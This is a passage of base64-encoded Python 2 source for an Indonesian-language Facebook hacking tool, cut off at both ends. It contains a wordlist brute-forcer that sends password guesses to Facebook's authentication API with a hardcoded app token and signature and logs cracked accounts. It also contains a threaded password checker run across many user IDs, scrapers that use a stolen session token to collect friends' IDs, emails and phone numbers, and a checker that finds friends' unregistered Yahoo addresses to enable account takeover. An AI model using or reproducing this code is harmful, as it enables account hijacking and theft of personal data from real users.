fbXNnJ106CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTdtW1x4MWJbMTs5M21bK11ceDFiWzE7OTdtICcgKyB1c2VyICsgJyB8ICcgKyBwYXNzNSArICcgLS0+ICcgKyBiWyduYW1lJ10KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFzczYgPSAoJ3NheWFuZycpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRhID0gdXJsbGliLnVybG9wZW4oJ2h0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0nICsgdXNlciArICcmbG9jYWxlPWVuX1VTJnBhc3N3b3JkPScgKyBwYXNzNiArICcmc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOTlmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZjYnKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcSA9IGpzb24ubG9hZChkYXRhKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgJ2FjY2Vzc190b2tlbicgaW4gcToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCAnXHgxYlsxOzk3bVx4MWJbMTs5Mm1b4pyTXVx4MWJbMTs5N20gJyArIHVzZXIgKyAnIHwgJyArIHBhc3M2ICsgJyAtLT4gJyArIGJbJ25hbWUnXQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAnd3d3LmZhY2Vib29rLmNvbScgaW4gcVsnZXJyb3JfbXNnJ106CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTdtXHgxYlsxOzkzbVsrXVx4MWJbMTs5N20gJyArIHVzZXIgKyAnIHwgJyArIHBhc3M2ICsgJyAtLT4gJyArIGJbJ25hbWUnXQoKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHBhc3MKCiAgICBwID0gVGhyZWFkUG9vbCgzMCkKICAgIHAubWFwKG1haW4sIGlkKQogICAgcHJpbnQgJ1xuXHgxYlsxOzkxbVsrXSBceDFiWzE7OTdtU2VsZXNhaScKICAgIHJhd19pbnB1dCgnXG5ceDFiWzE7OTFtWyBceDFiWzE7OTdtS2VtYmFsaSBceDFiWzE7OTFtXScpCiAgICBzdXBlcigpCgoKZGVmIGJydXRlKCk6CiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgIHRyeToKICAgICAgICB0b2tldCA9IG9wZW4oJ2xvZ2luLnR4dCcsICdyJykucmVhZCgpCiAgICBleGNlcHQgSU9FcnJvcjoKICAgICAgICBwcmludCAnXHgxYlsxOzkxbVshXSBUb2tlbiBub3QgZm91bmQnCiAgICAgICAgb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKICAgICAgICB0aW1lLnNsZWVwKDAuNSkKICAgICAgICBsb2dpbigpCiAgICBlbHNlOgogICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgICAgIHByaW50IGxvZ28KICAgICAgICBwcmludCAn4pWUJyArIDUyICogJ1x4MWJbMTs5N21ceGUyXHg5NVx4OTAnCiAgICAgICAgdHJ5OgogICAgICAgICAgICBlbWFpbCA9IHJhd19pbnB1dCgnXHgxYlsxOzkxbVsrXSBceDFiWzE7OTJtSURceDFiWzE7OTdtL1x4MWJbMTs5Mm1FbWFpbFx4MWJbMTs5N20vXHgxYlsxOzkybUhwIFx4MWJbMTs5N21UYXJnZXQgXHgxYlsxOzkxbTpceDFiWzE7OTdtICcpCiAgICAgICAgICAgIHBhc3N3ID0gcmF3X2lucHV0KCdceDFiWzE7OTFtWytdIFx4MWJbMTs5Mm1Xb3JkbGlzdCBceDFiWzE7OTdtZXh0KGxpc3QudHh0KSBceDFiWzE7OTFtOiBceDFiWzE7OTdtJykKICAgICAgICAgICAgdG90YWwgPSBvcGVuKHBhc3N3LCAncicpCiAgICAgICAgICAgIHRvdGFsID0gdG90YWwucmVhZGxpbmVzKCkKICAgICAgICAgICAgcHJpbnQgNTIgKiAnXHgxYlsxOzk3bVx4ZTJceDk1XHg5MCcKICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bXHgxYlsxOzk2bVx4ZTJceDljXHg5M1x4MWJbMTs5MW1dIFx4MWJbMTs5Mm1UYXJnZXQgXHgxYlsxOzkxbTpceDFiWzE7OTdtICcgKyBlbWFpbAogICAgICAgICAgICBwcmludCAnXHgxYlsxOzkxbVsrXSBceDFiWzE7OTJtVG90YWxceDFiWzE7OTZtICcgKyBzdHIobGVuKHRvdGFsKSkgKyAnIFx4MWJbMTs5Mm1QYXNzd29yZCcKICAgICAgICAgICAgamFsYW4oJ1x4MWJbMTs5MW1bXHhlMlx4OWNceGJhXSBceDFiWzE7OTJtUGxlYXNlIHdhaXQgXHgxYlsxOzk3bS4uLicpCiAgICAgICAgICAgIHNhbmRpID0gb3BlbihwYXNzdywgJ3InKQogICAgICAgICAgICBmb3IgcHcgaW4gc2FuZGk6CiAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgcHcgPSBwdy5yZXBsYWNlKCdcbicsICcnKQogICAgICAgICAgICAgICAgICAgIHN5cy5zdGRvdXQud3JpdGUoJ1xyXHgxYlsxOzkxbVtceDFiWzE7OTZtXHhlMlx4OWNceGI4XHgxYlsxOzkxbV0gXHgxYlsxOzkybVRyeSBceDFiWzE7OTdtJyArIHB3KQogICAgICAgICAgICAgICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQogICAgICAgICAgICAgICAgICAgIGRhdGEgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luP2FjY2Vzc190b2tlbj0yMzc3NTk5MDk1OTE2NTUlMjUyNTdDMGYxNDBhYWJlZGZiNjVhYzI3YTczOWVkMWEyMjYzYjEmZm9ybWF0PWpzb24mc2RrX3ZlcnNpb249MiZlbWFpbD0nICsgZW1haWwgKyAnJmxvY2FsZT1lbl9VUyZwYXNzd29yZD0nICsgcHcgKyAnJnNkaz1pb3MmZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzPTEmc2lnPTNmNTU1Zjk5ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWY2JykKICAgICAgICAgICAgICAgICAgICBtcHNoID0ganNvbi5sb2FkcyhkYXRhLnRleHQpCiAgICAgICAgICAgICAgICAgICAgaWYgJ2FjY2Vzc190b2tlbicgaW4gbXBzaDoKICAgICAgICAgICAgICAgICAgICAgICAgZGFwYXQgPSBvcGVuKCdCcnV0ZS50eHQnLCAndycpCiAgICAgICAgICAgICAgICAgICAgICAgIGRhcGF0LndyaXRlKGVtYWlsICsgJyB8ICcgKyBwdyArICdcbicpCiAgICAgICAgICAgICAgICAgICAgICAgIGRhcGF0LmNsb3NlKCkKICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgJ1xuXHgxYlsxOzkxbVsrXSBceDFiWzE7OTJtRm91bmRlZC4nCiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50IDUyICogJ1x4MWJbMTs5N21ceGUyXHg5NVx4OTAnCiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTFtW1x4ZTJceDllXHhiOV0gXHgxYlsxOzkybVVzZXJuYW1lIFx4MWJbMTs5MW06XHgxYlsxOzk3bSAnICsgZW1haWwKICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bXHhlMlx4OWVceGI5XSBceDFiWzE7OTJtUGFzc3dvcmQgXHgxYlsxOzkxbTpceDFiWzE7OTdtICcgKyBwdwogICAgICAgICAgICAgICAgICAgICAgICBrZWx1YXIoKQogICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICd3d3cuZmFjZWJvb2suY29tJyBpbiBtcHNoWydlcnJvcl9tc2cnXToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNla3MgPSBvcGVuKCdCcnV0ZWNla3BvaW50LnR4dCcsICd3JykKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNla3Mud3JpdGUoZW1haWwgKyAnIHwgJyArIHB3ICsgJ1xuJykKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNla3MuY2xvc2UoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgJ1xuXHgxYlsxOzkxbVsrXSBceDFiWzE7OTJtRm91bmRlZC4nCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCA1MiAqICdceDFiWzE7OTdtXHhlMlx4OTVceDkwJwogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bIV0gXHgxYlsxOzkzbUFjY291bnQgTWF5YmUgQ2hlY2twb2ludCcKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTFtW1x4ZTJceDllXHhiOV0gXHgxYlsxOzkybVVzZXJuYW1lIFx4MWJbMTs5MW06XHgxYlsxOzk3bSAnICsgZW1haWwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTFtW1x4ZTJceDllXHhiOV0gXHgxYlsxOzkybVBhc3N3b3JkIFx4MWJbMTs5MW06XHgxYlsxOzk3bSAnICsgcHcKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGtlbHVhcigpCiAgICAgICAgICAgICAgICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bIV0gQ29ubmVjdGlvbiBFcnJvcicKICAgICAgICAgICAgICAgICAgICB0aW1lLnNsZWVwKDEpCgogICAgICAgIGV4Y2VwdCBJT0Vycm9yOgogICAgICAgICAgICBwcmludCAnXHgxYlsxOzkxbVshXSBGaWxlIG5vdCBmb3VuZC4uLicKICAgICAgICAgICAgcHJpbnQgJ1xuXHgxYlsxOzkxbVshXSBceDFiWzE7OTJtU2VwZXJ0aW55YSBrYW11IHRpZGFrIG1lbWlsaWtpIHdvcmRsaXN0JwogICAgICAgICAgICB0YW55YXcoKQoKCmRlZiB0YW55YXcoKToKICAgIHdoeSA9IHJhd19pbnB1dCgnXHgxYlsxOzkxbVs/XSBceDFiWzE7OTJtS2FtdSBpbmdpbiBtZW1idWF0ICB3b3JkbGlzdCA/IFx4MWJbMTs5Mm1beS90XVx4MWJbMTs5MW06XHgxYlsxOzk3bSAnKQogICAgaWYgd2h5ID09ICcnOgogICAgICAgIHByaW50ICdceDFiWzE7OTFtWyFdIE1vaG9uIFBpbGloIFx4MWJbMTs5N20oeS90KScKICAgICAgICB0YW55YXcoKQogICAgZWxzZToKICAgICAgICBpZiB3aHkgPT0gJ3knOgogICAgICAgICAgICB3b3JkbGlzdCgpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgaWYgd2h5ID09ICdZJzoKICAgICAgICAgICAgICAgIHdvcmRsaXN0KCkKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIGlmIHdoeSA9PSAndCc6CiAgICAgICAgICAgICAgICAgICAgbWVudV9oYWNrKCkKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgaWYgd2h5ID09ICdUJzoKICAgICAgICAgICAgICAgICAgICAgICAgbWVudV9oYWNrKCkKICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICBwcmludCAnXHgxYlsxOzkxbVshXSBNb2hvbiBQaWxpaCBceDFiWzE7OTdtKHkvdCknCiAgICAgICAgICAgICAgICAgICAgICAgIHRhbnlhdygpCgoKZGVmIG1lbnVfeWFob28oKToKICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgdHJ5OgogICAgICAgIHRva2V0ID0gb3BlbignbG9naW4udHh0JywgJ3InKS5yZWFkKCkKICAgIGV4Y2VwdCBJT0Vycm9yOgogICAgICAgIHByaW50ICdceDFiWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCcKICAgICAgICBvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQogICAgICAgIHRpbWUuc2xlZXAoMSkKICAgICAgICBsb2dpbigpCgogICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICBwcmludCBsb2dvCiAgICBwcmludCA1MiAqICdceDFiWzE7OTdtXHhlMlx4OTVceDkwJwogICAgcHJpbnQgJ+KVkS0+IFx4MWJbMTszNzs0MG0xLiBGcm9tIEZyaWVuZHMnCiAgICBwcmludCAn4pWRLT4gXHgxYlsxOzM3OzQwbTIuIEZyb20gRmlsZScKICAgIHByaW50ICfilZEtPiBceDFiWzE7MzE7NDBtMC4gQmFjaycKICAgIHByaW50ICdceDFiWzE7Mzc7NDBt4pWRJwogICAgeWFob29fcGlsaWgoKQoKCmRlZiB5YWhvb19waWxpaCgpOgogICAgZ28gPSByYXdfaW5wdXQoJ+KVmuKVkFx4MWJbMTs5MW3ilrZceDFiWzE7OTdtICcpCiAgICBpZiBnbyA9PSAnJzoKICAgICAgICBwcmludCAnXHgxYlsxOzkxbVshXSBDYW5cJ3QgZW1wdHknCiAgICAgICAgeWFob29fcGlsaWgoKQogICAgZWxzZToKICAgICAgICBpZiBnbyA9PSAnMSc6CiAgICAgICAgICAgIHlhaG9vZnJpZW5kcygpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgaWYgZ28gPT0gJzInOgogICAgICAgICAgICAgICAgeWFob29saXN0KCkKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIGlmIGdvID09ICcwJzoKICAgICAgICAgICAgICAgICAgICBtZW51X2hhY2soKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludCAnXHgxYlsxOzkxbVtceGUyXHg5Y1x4OTZdIFx4MWJbMTs5N20nICsgZ28gKyAnIFx4MWJbMTs5MW1UaWRhayBEaXRlbXVrYW4nCiAgICAgICAgICAgICAgICAgICAgeWFob29fcGlsaWgoKQoKCmRlZiB5YWhvb2ZyaWVuZHMoKToKICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgdHJ5OgogICAgICAgIHRva2V0ID0gb3BlbignbG9naW4udHh0JywgJ3InKS5yZWFkKCkKICAgIGV4Y2VwdCBJT0Vycm9yOgogICAgICAgIHByaW50ICdceDFiWzE7OTFtWyFdIFRva2VuIFRpZGFrIEFkYScKICAgICAgICBvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQogICAgICAgIHRpbWUuc2xlZXAoMSkKICAgICAgICBsb2dpbigpCgogICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICBwcmludCBsb2dvCiAgICBwcmludCA1MiAqICdceDFiWzE7OTdtXHhlMlx4OTVceDkwJwogICAgbXBzaCA9IFtdCiAgICBqbWwgPSAwCiAgICBqYWxhbignXHgxYlsxOzkxbVtceGUyXHg5Y1x4YmFdIFx4MWJbMTs5Mm1Nb2hvbiBUdW5nZ3UgXHgxYlsxOzk3bS4uLicpCiAgICBmcmllbmRzID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZS9mcmllbmRzP2FjY2Vzc190b2tlbj0nICsgdG9rZXQpCiAgICBraW1hayA9IGpzb24ubG9hZHMoZnJpZW5kcy50ZXh0KQogICAgc2F2ZSA9IG9wZW4oJ01haWxWdWxuLnR4dCcsICd3JykKICAgIHByaW50IDUyICogJ1x4MWJbMTs5N21ceGUyXHg5NVx4OTAnCiAgICBmb3IgdyBpbiBraW1ha1snZGF0YSddOgogICAgICAgIGptbCArPSAxCiAgICAgICAgbXBzaC5hcHBlbmQoam1sKQogICAgICAgIGlkID0gd1snaWQnXQogICAgICAgIG5hbWEgPSB3WyduYW1lJ10KICAgICAgICBsaW5rcyA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJyArIGlkICsgJz9hY2Nlc3NfdG9rZW49JyArIHRva2V0KQogICAgICAgIHogPSBqc29uLmxvYWRzKGxpbmtzLnRleHQpCiAgICAgICAgdHJ5OgogICAgICAgICAgICBtYWlsID0gelsnZW1haWwnXQogICAgICAgICAgICB5YWhvbyA9IHJlLmNvbXBpbGUoJ0AuKicpCiAgICAgICAgICAgIG90dyA9IHlhaG9vLnNlYXJjaChtYWlsKS5ncm91cCgpCiAgICAgICAgICAgIGlmICd5YWhvby5jb20nIGluIG90dzoKICAgICAgICAgICAgICAgIGJyLm9wZW4oJ2h0dHBzOi8vbG9naW4ueWFob28uY29tL2NvbmZpZy9sb2dpbj8uc3JjPWZwY3R4Ji5pbnRsPWlkJi5sYW5nPWlkLUlEJi5kb25lPWh0dHBzOi8vaWQueWFob28uY29tJykKICAgICAgICAgICAgICAgIGJyLl9mYWN0b3J5LmlzX2h0bWwgPSBUcnVlCiAgICAgICAgICAgICAgICBici5zZWxlY3RfZm9ybShucj0wKQogICAgICAgICAgICAgICAgYnJbJ3VzZXJuYW1lJ10gPSBtYWlsCiAgICAgICAgICAgICAgICBrbGlrID0gYnIuc3VibWl0KCkucmVhZCgpCiAgICAgICAgICAgICAgICBqb2sgPSByZS5jb21waWxlKCcibWVzc2FnZXMuRVJST1JfSU5WQUxJRF9VU0VSTkFNRSI+LionKQogICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgIHBlayA9IGpvay5zZWFyY2goa2xpaykuZ3JvdXAoKQogICAgICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTFtW1x4ZTJceDljXHg5Nl0gXHgxYlsxOzkybUVtYWlsIFx4MWJbMTs5MW06XHgxYlsxOzkxbSAnICsgbWFpbCArICcgXHgxYlsxOzk3bVtceDFiWzE7OTJtJyArIHZ1bG5vdCArICdceDFiWzE7OTdtXScKICAgICAgICAgICAgICAgICAgICBjb250aW51ZQoKICAgICAgICAgICAgICAgIGlmICcibWVzc2FnZXMuRVJST1JfSU5WQUxJRF9VU0VSTkFNRSI+JyBpbiBwZWs6CiAgICAgICAgICAgICAgICAgICAgc2F2ZS53cml0ZShtYWlsICsgJ1xuJykKICAgICAgICAgICAgICAgICAgICBwcmludCA1MiAqICdceDFiWzE7OTdtXHhlMlx4OTVceDkwJwogICAgICAgICAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTFtW1x4MWJbMTs5Nm1ceGUyXHg5Y1x4OTNceDFiWzE7OTFtXSBceDFiWzE7OTJtTmFtZSAgXHgxYlsxOzkxbTpceDFiWzE7OTdtICcgKyBuYW1hCiAgICAgICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW1bXHhlMlx4OWVceGI5XSBceDFiWzE7OTJtSUQgICAgXHgxYlsxOzkxbTpceDFiWzE7OTdtICcgKyBpZAogICAgICAgICAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTFtW1x4ZTJceDllXHhiOV0gXHgxYlsxOzkybUVtYWlsIFx4MWJbMTs5MW06XHgxYlsxOzk3bSAnICsgbWFpbCArICcgW1x4MWJbMTs5Mm0nICsgdnVsbiArICdceDFiWzE7OTdtXScKICAgICAgICAgICAgICAgICAgICBwcmludCA1MiAqICdceDFiWzE7OTdtXHhlMlx4OTVceDkwJwogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludCAnXHgxYlsxOzkxbVtceGUyXHg5Y1x4OTZdIFx4MWJbMTs5Mm1FbWFpbCBceDFiWzE7OTFtOlx4MWJbMTs5MW0gJyArIG1haWwgKyAnIFx4MWJbMTs5N21bXHgxYlsxOzkybScgKyB2dWxub3QgKyAnXHgxYlsxOzk3bV0nCiAgICAgICAgZXhjZXB0IEtleUVycm9yOgogICAgICAgICAgICBwYXNzCgogICAgcHJpbnQgJ1xuXHgxYlsxOzkxbVsrXSBceDFiWzE7OTdtU2VsZXNhaScKICAgIHByaW50ICdceDFiWzE7OTFtWytdIFx4MWJbMTs5N21TaW1wYW4gXHgxYlsxOzkxbTpceDFiWzE7OTdtIE1haWxWdWxuLnR4dCcKICAgIHNhdmUuY2xvc2UoKQogICAgcmF3X2lucHV0KCdcblx4MWJbMTs5MW1bIFx4MWJbMTs5N21LZW1iYWxpIFx4MWJbMTs5MW1dJykKICAgIG1lbnVfeWFob28oKQoKCmRlZiB5YWhvb2xpc3QoKToKICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgdHJ5OgogICAgICAgIHRva2V0ID0gb3BlbignbG9naW4udHh0JywgJ3InKS5yZWFkKCkKICAgIGV4Y2VwdCBJT0Vycm9yOgogICAgICAgIHByaW50ICdceDFiWzE7OTFtWyFdIFRva2VuIG5vdCBmb3VuZCcKICAgICAgICBvcy5zeXN0ZW0oJ3JtIC1yZiBsb2dpbi50eHQnKQogICAgICAgIHRpbWUuc2xlZXAoMSkKICAgICAgICBsb2dpbigpCiAgICBlbHNlOgogICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgICAgIHByaW50IGxvZ28KICAgICAgICBwcmludCA1MiAqICdceDFiWzE7OTdtXHhlMlx4OTVceDkwJwogICAgICAgIGZpbGVzID0gcmF3X2lucHV0KCdceDFiWzE7OTFtWytdIFx4MWJbMTs5Mm1GaWxlIFx4MWJbMTs5MW06IFx4MWJbMTs5N20nKQogICAgICAgIHRyeToKICAgICAgICAgICAgdG90YWwgPSBvcGVuKGZpbGVzLCAncicpCiAgICAgICAgICAgIG1haWwgPSB0b3RhbC5yZWFkbGluZXMoKQogICAgICAgIGV4Y2VwdCBJT0Vycm9yOgogICAgICAgICAgICBwcmludCAnXHgxYlsxOzkxbVshXSBGaWxlIG5vdCBmb3VuZCcKICAgICAgICAgICAgcmF3X2lucHV0KCdcblx4MWJbMTs5MW1bIFx4MWJbMTs5N21CYWNrIFx4MWJbMTs5MW1dJykKICAgICAgICAgICAgbWVudV95YWhvbygpCgogICAgbXBzaCA9IFtdCiAgICBqbWwgPSAwCiAgICBqYWxhbignXHgxYlsxOzkxbVtceGUyXHg5Y1x4YmFdIFx4MWJbMTs5Mm1QbGVhc2Ugd2FpdCBceDFiWzE7OTdtLi4uJykKICAgIHNhdmUgPSBvcGVuKCdNYWlsVnVsbi50eHQnLCAndycpCiAgICBwcmludCA1MiAqICdceDFiWzE7OTdtXHhlMlx4OTVceDkwJwogICAgcHJpbnQgJ1x4MWJbMTs5MW1bP10gXHgxYlsxOzk3bVN0YXR1cyBceDFiWzE7OTFtOiAgXHgxYlsxOzk3bVJlZFtceDFiWzE7OTJtJyArIHZ1bG5vdCArICdceDFiWzE7OTdtXSAgR3JlZW5bXHgxYlsxOzkybScgKyB2dWxuICsgJ1x4MWJbMTs5N21dJwogICAgcHJpbnQKICAgIG1haWwgPSBvcGVuKGZpbGVzLCAncicpLnJlYWRsaW5lcygpCiAgICBmb3IgcHcgaW4gbWFpbDoKICAgICAgICBtYWlsID0gcHcucmVwbGFjZSgnXG4nLCAnJykKICAgICAgICBqbWwgKz0gMQogICAgICAgIG1wc2guYXBwZW5kKGptbCkKICAgICAgICB5YWhvbyA9IHJlLmNvbXBpbGUoJ0AuKicpCiAgICAgICAgb3R3ID0geWFob28uc2VhcmNoKG1haWwpLmdyb3VwKCkKICAgICAgICBpZiAneWFob28uY29tJyBpbiBvdHc6CiAgICAgICAgICAgIGJyLm9wZW4oJ2h0dHBzOi8vbG9naW4ueWFob28uY29tL2NvbmZpZy9sb2dpbj8uc3JjPWZwY3R4Ji5pbnRsPWlkJi5sYW5nPWlkLUlEJi5kb25lPWh0dHBzOi8vaWQueWFob28uY29tJykKICAgICAgICAgICAgYnIuX2ZhY3RvcnkuaXNfaHRtbCA9IFRydWUKICAgICAgICAgICAgYnIuc2VsZWN0X2Zvcm0obnI9MCkKICAgICAgICAgICAgYnJbJ3VzZXJuYW1lJ10gPSBtYWlsCiAgICAgICAgICAgIGtsaWsgPSBici5zdWJtaXQoKS5yZWFkKCkKICAgICAgICAgICAgam9rID0gcmUuY29tcGlsZSgnIm1lc3NhZ2VzLkVSUk9SX0lOVkFMSURfVVNFUk5BTUUiPi4qJykKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgcGVrID0gam9rLnNlYXJjaChrbGlrKS5ncm91cCgpCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTFtICcgKyBtYWlsCiAgICAgICAgICAgICAgICBjb250aW51ZQoKICAgICAgICAgICAgaWYgJyJtZXNzYWdlcy5FUlJPUl9JTlZBTElEX1VTRVJOQU1FIj4nIGluIHBlazoKICAgICAgICAgICAgICAgIHNhdmUud3JpdGUobWFpbCArICdcbicpCiAgICAgICAgICAgICAgICBwcmludCAnXHgxYlsxOzkybSAnICsgbWFpbAogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5MW0gJyArIG1haWwKCiAgICBwcmludCAnXG5ceDFiWzE7OTFtWytdIFx4MWJbMTs5N21GaW5pc2gnCiAgICBwcmludCAnXHgxYlsxOzkxbVsrXSBceDFiWzE7OTdtU2F2ZWQgXHgxYlsxOzkxbTpceDFiWzE7OTdtIE1haWxWdWxuLnR4dCcKICAgIHNhdmUuY2xvc2UoKQogICAgcmF3X2lucHV0KCdcblx4MWJbMTs5MW1bIFx4MWJbMTs5N21CYWNrIFx4MWJbMTs5MW1dJykKICAgIG1lbnVfeWFob28oKQoKCmRlZiBncmFiKCk6CiAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgIHRyeToKICAgICAgICB0b2tldCA9IG9wZW4oJ2xvZ2luLnR4dCcsICdyJykucmVhZCgpCiAgICBleGNlcHQgSU9FcnJvcjoKICAgICAgICBwcmludCAnXHgxYlsxOzkxbVshXSBUb2tlbiBub3QgZm91bmQnCiAgICAgICAgb3Muc3lzdGVtKCdybSAtcmYgbG9naW4udHh0JykKICAgICAgICB0aW1lLnNsZWVwKDEpCiAgICAgICAgbG9naW4oKQoKICAgIG9zLnN5c3RlbSgnY2xlYXInKQogICAgcHJpbnQgbG9nbwogICAgcHJpbnQgNTIgKiAnXHgxYlsxOzk3bVx4ZTJceDk1XHg5MCcKICAgIHByaW50ICfilZEtPiBceDFiWzE7Mzc7NDBtMS4gR2V0IElEIEZyb20gRnJpZW5kcycKICAgIHByaW50ICfilZEtPiBceDFiWzE7Mzc7NDBtMi4gR2V0IEZyaWVuZHMgSUQgRnJvbSBGcmllbmRzJwogICAgcHJpbnQgJ+KVkS0+IFx4MWJbMTszNzs0MG0zLiBHZXQgSUQgRnJvbSBHUlVQJwogICAgcHJpbnQgJ+KVkS0+IFx4MWJbMTszNzs0MG00LiBHZXQgRnJpZW5kcyBFbWFpbCcKICAgIHByaW50ICfilZEtPiBceDFiWzE7Mzc7NDBtNS4gR2V0IEZyaWVuZHMgRW1haWwgRnJvbSBGcmllbmRzJwogICAgcHJpbnQgJ+KVkS0+IFx4MWJbMTszNzs0MG02LiBHZXQgUGhvbmUgRnJvbSBGcmllbmRzJwogICAgcHJpbnQgJ+KVkS0+IFx4MWJbMTszNzs0MG03LiBHZXQgRnJpZW5kXCdzIFBob25lIEZyb20gRnJpZW5kcycKICAgIHByaW50ICfilZEtPiBceDFiWzE7MzE7NDBtMC4gQmFjaycKICAgIHByaW50ICdceDFiWzE7Mzc7NDBt4pWRJwogICAgZ3JhYl9waWxpaCgpCgoKZGVmIGdyYWJfcGlsaWgoKToKICAgIGN1aWggPSByYXdfaW5wdXQoJ+KVmuKVkFx4MWJbMTs5MW3ilrZceDFiWzE7OTdtICcpCiAgICBpZiBjdWloID09ICcnOgogICAgICAgIHByaW50ICdceDFiWzE7OTFtWyFdIENhblwndCBlbXB0eScKICAgICAgICBncmFiX3BpbGloKCkKICAgIGVsc2U6CiAgICAgICAgaWYgY3VpaCA9PSAnMSc6CiAgICAgICAgICAgIGlkX2ZyaWVuZHMoKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIGlmIGN1aWggPT0gJzInOgogICAgICAgICAgICAgICAgaWRmcm9tX2ZyaWVuZHMoKQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgaWYgY3VpaCA9PSAnM